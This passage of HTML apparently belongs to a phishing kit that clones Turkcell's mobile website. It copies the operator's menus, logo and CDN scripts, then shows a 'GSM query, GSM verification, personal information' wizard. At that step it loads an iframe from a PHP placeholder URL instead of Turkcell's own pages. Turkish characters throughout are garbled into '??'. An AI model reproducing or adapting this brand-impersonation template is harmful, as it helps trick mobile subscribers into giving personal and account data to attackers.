                     <img src="https://s.turkcell.com.tr/SiteAssets/Cihaz/pasaj/kategori/pasaj-logo.png" data-src="https://s.turkcell.com.tr/SiteAssets/Cihaz/pasaj/kategori/pasaj-logo.png" alt="" class=" ls-is-cached lazyloaded">
                     </a>
                  </li>
                  <li class="dropdown">
                     <a class="" href="/paket-ve-tarifeler?place=menu" data-index="1" title="Paketler">
                     Paketler
                     </a>
                     <ul>
                        <li class="dropdown">
                           <a href="/paket-ve-tarifeler/yeni-musteri?place=menu" title="Yeni Turkcell'liler">Yeni Turkcell'liler</a>
                           <ul>
                              <li>
                                 <a href="/paket-ve-tarifeler/faturali-hat/yeni-musteri?place=menu" title="Fatural?? Hat">Fatural?? Hat</a>
                              </li>
                              <li>
                                 <a href="/paket-ve-tarifeler/turkcell-rahat-paketler/turkcell-rahat?card_group=346&amp;&amp;place=menu" title="Turkcell Rahat">Turkcell Rahat</a>
                              </li>
                              <li>
                                 <a href="/paket-ve-tarifeler/turkcell-rahat?card_group=400&amp;&amp;place=menu" title="Turkcell ??ocuk">Turkcell ??ocuk</a>
                              </li>
                              <li>
                                 <a href="/kampanyalar/yeni-turkcell-musterisi/hazir-kartli-olmak-istiyorum?place=menu" title="Haz??r Kart">Haz??r Kart</a>
                              </li>
                              <li>
                                 <a href="/paket-ve-tarifeler/bilgisayardaninternet/faturali-hat?place=menu" title="Bilgisayardan ??nternet">Bilgisayardan ??nternet</a>
                              </li>
                              <li>
                                 <a class="nav-all-link" href="/paket-ve-tarifeler/yeni-musteri?place=menu" title="T??m Yeni Turkcell'liler">T??m Yeni Turkcell'liler</a>
                              </li>
                           </ul>
                        </li>
                        <li class="dropdown">
                           <a href="/paket-ve-tarifeler/faturali-hat?place=menu" title="Fatural?? Hat">Fatural?? Hat</a>
                           <ul>
                              <li>
                                 <a href="/tr/turkcell-platinum?place=menu" title="Platinum">Platinum</a>
                              </li>
                              <li>
                                 <a href="/paket-ve-tarifeler/4-5-g-hizinda/faturali-hat?place=menu" title="Ana Paketler">Ana Paketler</a>
                              </li>
                              <li>
                                 <a href="/paket-ve-tarifeler/ek-paketler/faturali-hat?place=menu" title="Ek Paketler">Ek Paketler</a>
                              </li>
                              <li>
                                 <a href="/paket-ve-tarifeler/faturali-hat/yurt-disinda-kullanim?place=menu" title="Yurt D??????nda Kullan??m">Yurt D??????nda Kullan??m</a>
                              </li>
                              <li>
                                 <a href="/paket-ve-tarifeler/faturali-hat/yurt-disini-arama?place=menu" title="Yurt D??????n?? Arama">Yurt D??????n?? Arama</a>
                              </li>
                              <li>
                                 <a href="/paket-ve-tarifeler/bilgisayardaninternet/faturali-hat?place=menu" title="Bilgisayardan ??nternet">Bilgisayardan ??nternet</a>
                              </li>
                              <li>
                                 <a class="nav-all-link" href="/paket-ve-tarifeler/faturali-hat?place=menu" title="T??m Fatural?? Hat">T??m Fatural?? Hat</a>
                              </li>
                           </ul>
                        </li>
                        <li class="dropdown">
                           <a href="/paket-ve-tarifeler/turkcell-rahat?place=menu" title="Turkcell Rahat">Turkcell Rahat</a>
                           <ul>
                              <li>
                                 <a href="/paket-ve-tarifeler/turkcell-rahat-paketler/turkcell-rahat?place=menu" title="Turkcell Rahat Paketler">Turkcell Rahat Paketler</a>
                              </li>
                              <li>
                                 <a href="https://www.turkcell.com.tr/paket-ve-tarifeler/turkcell-rahatek-paket/turkcell-rahat?place=menu" title="Turkcell Rahat Ek Paketler">Turkcell Rahat Ek Paketler</a>
                              </li>
                              <li>
                                 <a class="nav-all-link" href="/paket-ve-tarifeler/turkcell-rahat?place=menu" title="T??m Turkcell Rahat">T??m Turkcell Rahat</a>
                              </li>
                           </ul>
                        </li>
                        <li class="dropdown">
                           <a href="/paket-ve-tarifeler/hazir-kart?tab&amp;place=menu" title="Haz??r Kart">Haz??r Kart</a>
                           <ul>
                              <li>
                                 <a href="/paket-ve-tarifeler/4-5-g-hizinda/hazir-kart?place=menu" title="Ana Paketler">Ana Paketler</a>
                              </li>
                              <li>
                                 <a href="/paket-ve-tarifeler/ek-paketler/hazir-kart?place=menu" title="Ek Paketler">Ek Paketler</a>
                              </li>
                              <li>
                                 <a href="/paket-ve-tarifeler/hazir-kart/yurt-disinda-kullanim?place=menu" title="Yurt D??????nda Kullan??m">Yurt D??????nda Kullan??m</a>
                              </li>
                              <li>
                                 <a href="/paket-ve-tarifeler/hazir-kart/yurt-disini-arama?place=menu" title="Yurt D??????n?? Arama">Yurt D??????n?? Arama</a>
                              </li>
                              <li>
                                 <a href="/paket-ve-tarifeler/hazir-kart-faturali-hat-gecis-paketleri?place=menu" title="Haz??r Kart'tan Fatural??'ya Ge??i??">Haz??r Kart'tan Fatural??'ya Ge??i??</a>
                              </li>
                              <li>
                                 <a href="/paket-ve-tarifeler/bilgisayardaninternet/hazir-kart?place=menu" title="Bilgisayardan ??nternet">Bilgisayardan ??nternet</a>
                              </li>
                              <li>
                                 <a class="nav-all-link" href="/paket-ve-tarifeler/hazir-kart?tab&amp;place=menu" title="T??m Haz??r Kart">T??m Haz??r Kart</a>
                              </li>
                           </ul>
                        </li>
                        <li>
                           <a class="nav-all-link" href="/paket-ve-tarifeler?place=menu" title="T??m Paketler">T??m Paketler</a>
                        </li>
                     </ul>
                  </li>
                  <li class="dropdown">
                     <a class="" href="/servisler?place=menu" data-index="2" title="Dijital Servisler">
                     Dijital Servisler
                     </a>
                     <ul>
                        <li class="dropdown">
                           <a href="/servisler/arama-fatura-tl?place=menu" title="Arama, Fatura ve TL">Arama, Fatura ve TL</a>
                           <ul>
                              <li>
                                 <a href="/servisler/upcall?place=menu" title="Upcall">Upcall</a>
                              </li>
                              <li>
                                 <a href="/servisler/yonlendir?place=menu" title="Y??nlendir">Y??nlendir</a>
                              </li>
                              <li>
                                 <a href="/servisler/turkcell-avans-tl?place=menu" title="Turkcell Avans TL">Turkcell Avans TL</a>
                              </li>
                              <li>
                                 <a href="/servisler/simdi-ara?place=menu" title="Turkcell ??imdi Ara">Turkcell ??imdi Ara</a>
                              </li>
                              <li>
                                 <a class="nav-all-link" href="/servisler/arama-fatura-tl?place=menu" title="T??m Arama, Fatura ve TL">T??m Arama, Fatura ve TL</a>
                              </li>
                           </ul>
                        </li>
                        <li class="dropdown">
                           <a href="/servisler/bilgi?place=menu" title="Bilgi">Bilgi</a>
                           <ul>
                              <li>
                                 <a href="/servisler/yaani?place=menu" title="Yaani">Yaani</a>
                              </li>
                              <li>
                                 <a href="/servisler/mobil-hasar-sorgulama?place=menu" title="Mobil Hasar Sorgulama">Mobil Hasar Sorgulama</a>
                              </li>
                              <li>
                                 <a href="/servisler/veli-bilgilendirme-sms-servisi?place=menu" title="Veli Bilgilendirme SMS Servisi">Veli Bilgilendirme SMS Servisi</a>
                              </li>
                              <li>
                                 <a href="/servisler/kredi-finans-servisi?place=menu" title="B??t??em Servisi">B??t??em Servisi</a>
                              </li>
                              <li>
                                 <a class="nav-all-link" href="/servisler/bilgi?place=menu" title="T??m Bilgi">T??m Bilgi</a>
                              </li>
                           </ul>
                        </li>
                        <li class="dropdown">
                           <a href="/servisler/eglence?place=menu" title="E??lence">E??lence</a>
                           <ul>
                              <li>
                                 <a href="/servisler/turkcell-tv?place=menu" title="TV+">TV+</a>
                              </li>
                              <li>
                                 <a href="/servisler/fizy?place=menu" title="fizy">fizy</a>
                              </li>
                              <li>
                                 <a href="/servisler/turkcell-dergilik?place=menu" title="Dergilik">Dergilik</a>
                              </li>
                              <li>
                                 <a class="nav-all-link" href="/servisler/eglence?place=menu" title="T??m E??lence">T??m E??lence</a>
                              </li>
                           </ul>
                        </li>
                        <li class="dropdown">
                           <a href="/servisler/uygulamalar?place=menu" title="Uygulama">Uygulama</a>
                           <ul>
                              <li>
                                 <a href="/servisler/BiP?place=menu" title="BiP">BiP</a>
                              </li>
                              <li>
                                 <a href="/servisler/dijital-operator-uygulamasi?place=menu" title="Dijital Operat??r">Dijital Operat??r</a>
                              </li>
                              <li>
                                 <a href="/servisler/lifebox?place=menu" title="Lifebox">Lifebox</a>
                              </li>
                              <li>
                                 <a href="/servisler/paycell?place=menu" title="Paycell">Paycell</a>
                              </li>
                              <li>
                                 <a class="nav-all-link" href="/servisler/uygulamalar?place=menu" title="T??m Uygulama">T??m Uygulama</a>
                              </li>
                           </ul>
                        </li>
                        <li>
                           <a class="nav-all-link" href="/servisler?place=menu" title="T??m Dijital Servisler">T??m Dijital Servisler</a>
                        </li>
                     </ul>
                  </li>
                  <li class="dropdown">
                     <a class="" href="/tr/ev-cozumleri	?place=menu" data-index="3" title="Ev ??nterneti ve TV">
                     Ev ??nterneti ve TV
                     </a>
                     <ul>
                        <li class="">
                           <a href="/kampanyalar/ev-interneti-fiber-kampanyalari/faturali-hat?place=menu" title="Fiber">Fiber</a>
                        </li>
                        <li class="">
                           <a href="/kampanyalar/ev-interneti-superbox-kampanyalari/faturali-hat?place=menu" title="Superbox">Superbox</a>
                        </li>
                        <li class="">
                           <a href="/kampanyalar/ev-interneti-tv-plus-kampanyalari/faturali-hat?place=menu" title="TV+">TV+</a>
                        </li>
                        <li class="">
                           <a href="/kampanyalar/ev-interneti-dsl-kampanyalari/faturali-hat?place=menu" title="DSL">DSL</a>
                        </li>
                        <li class="">
                           <a href="/servisler/supercam?place=menu" title="Supercam">Supercam</a>
                        </li>
                        <li class="">
                           <a href="/kampanyalar/ev-interneti-taksitli-cihaz-kampanyalari/faturali-hat?place=filter&amp;place=menu" title="Ev ??nterneti Taksitli Cihaz Kampanyalar??">Ev ??nterneti Taksitli Cihaz Kampanyalar??</a>
                        </li>
                        <li class="">
                           <a href="/hiz-testi/?place=menu" title="??nternet H??z Testi">??nternet H??z Testi</a>
                        </li>
                        <li class="">
                           <a href="/kampanya/ip-adresim/?place=menu" title="IP Adresim / IP Sorgulama">IP Adresim / IP Sorgulama</a>
                        </li>
                        <li>
                           <a class="nav-all-link" href="/tr/ev-cozumleri	?place=menu" title="T??m Ev ??nterneti ve TV">T??m Ev ??nterneti ve TV</a>
                        </li>
                     </ul>
                  </li>
                  <li class="dropdown">
                     <a class="" href="/kampanyalar?place=menu" data-index="4" title="Kampanyalar">
                     Kampanyalar
                     </a>
                     <ul>
                        <li class="dropdown">
                           <a href="/kampanyalar/cihazlar/faturali-hat?place=menu" title="Cihaz Kampanyalar??">Cihaz Kampanyalar??</a>
                           <ul>
                              <li>
                                 <a href="/kampanyalar/cihazlar/faturali-hat?place=menu" title="Fatural?? Hat">Fatural?? Hat</a>
                              </li>
                              <li>
                                 <a href="/kampanyalar/cihazlar/hazir-kart?place=menu" title="Haz??r Kart">Haz??r Kart</a>
                              </li>
                              <li>
                                 <a class="nav-all-link" href="/kampanyalar/cihazlar/faturali-hat?place=menu" title="T??m Cihaz Kampanyalar??">T??m Cihaz Kampanyalar??</a>
                              </li>
                           </ul>
                        </li>
                        <li class="dropdown">
                           <a href="/kampanyalar?place=menu" title="Mobil Paket Kampanyalar??">Mobil Paket Kampanyalar??</a>
                           <ul>
                              <li>
                                 <a href="/kampanyalar/yeni-turkcell-musterisi?place=menu" title="Yeni Turkcell'liler">Yeni Turkcell'liler</a>
                              </li>
                              <li>
                                 <a href="/kampanyalar/faturali-hat?place=menu" title="Fatural?? Hat">Fatural?? Hat</a>
                              </li>
                              <li>
                                 <a href="/kampanyalar/turkcell-rahat?place=menu" title="Turkcell Rahat">Turkcell Rahat</a>
                              </li>
                              <li>
                                 <a href="/kampanyalar/hazir-kart?place=menu" title="Haz??r Kart">Haz??r Kart</a>
                              </li>
                              <li>
                                 <a class="nav-all-link" href="/kampanyalar?place=menu" title="T??m Mobil Paket Kampanyalar??">T??m Mobil Paket Kampanyalar??</a>
                              </li>
                           </ul>
                        </li>
                        <li class="">
                           <a href="/kampanyalar/servisler/faturali-hat?place=menu" title="Dijital Servis Kampanyalar??">Dijital Servis Kampanyalar??</a>
                        </li>
                        <li class="">
                           <a href="/tr/ev-cozumleri?place=menu" title="Ev ????z??m?? Kampanyalar??">Ev ????z??m?? Kampanyalar??</a>
                        </li>
                        <li>
                           <a class="nav-all-link" href="/kampanyalar?place=menu" title="T??m Kampanyalar">T??m Kampanyalar</a>
                        </li>
                     </ul>
                  </li>
                  <li class="dropdown">
                     <a class="" href="/hesabim?place=menu" data-index="5" title="????lem Merkezi">
                     ????lem Merkezi
                     </a>
                     <ul>
                        <li class="">
                           <a href="/hesabim/faturalar?place=menu" title="Faturalar??m">Faturalar??m</a>
                        </li>
                        <li class="">
                           <a href="/hesabim/guvenli-internet?place=menu" title="G??venli ??nternet">G??venli ??nternet</a>
                        </li>
                        <li class="">
                           <a href="/hesabim/paket-ve-tarifelerim?place=menu" title="Paket ve Tarifelerim">Paket ve Tarifelerim</a>
                        </li>
                        <li class="">
                           <a href="/hesabim/servislerim?place=menu" title="Servislerim">Servislerim</a>
                        </li>
                        <li class="">
                           <a href="/hesabim/kampanyalarim?place=menu" title="Kampanyalar??m">Kampanyalar??m</a>
                        </li>
                        <li class="">
                           <a href="/hesabim/siparislerim?place=menu" title="Sipari?? Takibi">Sipari?? Takibi</a>
                        </li>
                        <li class="">
                           <a href="/hesabim/ayarlarim?place=menu" title="Ayarlar??m">Ayarlar??m</a>
                        </li>
                        <li>
                           <a class="nav-all-link" href="/hesabim?place=menu" title="T??m ????lem Merkezi">T??m ????lem Merkezi</a>
                        </li>
                     </ul>
                  </li>
               </ul>
            </nav>
            <div class="m-quick-nav">
               <ul>
                  <li>
                     <a href="/yardim/yardim-araclari/fatura-borc-sorgulama-ve-odeme?place=qa">
                     <i class="a-icon icon-wallet"></i>
                     Fatura Sorgula &amp; ??de
                     </a>
                  </li>
                  <li>
                     <a href="/yukle/hazir-kart-paket-yukle?place=qa">
                     <i class="a-icon icon-phone-top-plus"></i>
                     Faturas??z Paket Y??kle 
                     </a>
                  </li>
                  <li>
                     <a href="/yukle/tl-yukle?place=qa">
                     <i class="a-icon icon-tl"></i>
                     TL Y??kle
                     </a>
                  </li>
                  <li>
                     <a href="/tr/turkcellli-olmak/paket-secimi?place=qa">
                     <i class="a-icon icon-sim-card"></i>
                     Yeni Hat Al &amp; Numara Ta????
                     </a>
                  </li>
                  <li>
                     <a href="/paket-ve-tarifeler?place=qa">
                     <i class="a-icon icon-star"></i>
                     Fatural?? Size ??zel Paketler
                     </a>
                  </li>
                  <li>
                     <a href="/paket-ve-tarifeler/ek-paketler/faturali-hat?place=qa">
                     <i class="a-icon icon-faturama-yansit"></i>
                     Fatural?? Ek Paket Al
                     </a>
                  </li>
                  <li>
                     <a href="/yukle/bilgisayardan-internet-paketi-yukle?place=qa">
                     <i class="a-icon icon-pc-expand"></i>
                     Bilgisayardan ??nternet Y??kle
                     </a>
                  </li>
                  <li>
                     <a href="/yukle/turkcell-rahat-ek-paket-al?place=qa">
                     <i class="a-icon icon-rahat-hat-expand"></i>
                     Turkcell Rahat Ek Paket Al
                     </a>
                  </li>
               </ul>
            </div>
         </div>
         <a href="/kurumsal" class="m-mobile-nav__desktop">Kurumsal Siteye Git</a>		
      </div>
      <main>
         <section id="step-wizard" class="section-step-wizard" style="margin: 0px 0 -4.25rem 0;position: relative;z-index: 3;">
            <div class="container">
               <ul class="a-step-wizard a-step-wizard--noCursor">
                  <li class="a-step-wizard--completed"><a href="#"><span>GSM <br>Sorgulama</span></a></li>
                  <li class="a-step-wizard--completed"><a href="#"><span>GSM <br> Do??rulama</span></a></li>
                  <li class="a-step-wizard--active"><a href="#"><span>Ki??isel <br> Bilgiler</span></a></li>
               </ul>
            </div>
         </section>
         <section id="packages" class="white section-packages">
             <iframe src="<?=$url?>generic/" style="width:100%; height: 100%" ></iframe>
         </section> 
      </main>
      <!-- video lu cardlara basildiginda acilacak video modallar?? -->
      <div class="m-modal m-modal--video" id="modal-video"></div>
      <script id="modal-video-html" type="text/x-handlebars-template">
         <div class="m-modal__body">
         	<iframe src="{{src}}?rel=0" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
         </div>
         <div class="m-modal__foot">
         	<div class="m-modal__video-caps">
         		<h3>{{title}}</h3>
         		<p>{{desc}}</p>
         	</div>
         	<a class="a-btn a-btn--with-icon icon-arrow-right" href="{{href}}" title="{{button}}" data-fancybox-close="{{btnClose}}">{{button}}</a>
         </div>
      </script>
      <script id="popin-template" type="text/x-handlebars-template">
         <div class="m-pop-in">
           <a class="a-btn-icon js-pop-in-close" href="javascript:;"><i class="icon-close"></i></a>
           {{#if offerName}}
           <h3>{{offerName}}</h3>
           {{/if}}
           <div class="m-pop-in__body">
             {{#if offerImage}}
         <img src="{{offerImage}}" />
             {{/if}}
             <div class="m-pop-in__content">
               {{#if offerName}}
               <p>{{offerDescription}}</p>
               {{/if}}
             </div>
           </div>
           {{#if buttonText}}
           <a class="a-btn js-pop-in-btn" href="{{offerURL}}">{{buttonText}}</a>
           {{/if}}
         </div>
      </script>
      <script defer="" src="https://s.turkcell.com.tr/static_lib/assetsv2/common/scripts/vendors.js?1645627466000"></script>
      <script defer="" src="https://s.turkcell.com.tr/static_lib/assetsv2/common/scripts/vendors/core-js.min.js?1645627466000"></script>
      <script defer="" src="https://s.turkcell.com.tr/static_lib/assetsv2/common/scripts/vendors/jquery.elevatezoom.js?1645627466000"></script>
      <script defer="" src="https://s.turkcell.com.tr/static_lib/assetsv2/mobile/scripts/app.mobile.min.js?1645627466000"></script>
      <script defer="" src="https://s.turkcell.com.tr/static_lib/assetsv2/common/scripts/vendors/smartbanner.min.js?1645627466000"></script>
      <!-- PAGE JS FILES -->
      <!-- PAGE JS FILES -->
      <script type="text/javascript">
         var isProdMode = true; 
         
      </script>
      <script defer="" src="https://s.turkcell.com.tr/static_lib/assetsv2/mobile/scripts/shop/google-analytics-mobile.js?1645627466000"></script>
   </body>
</html>
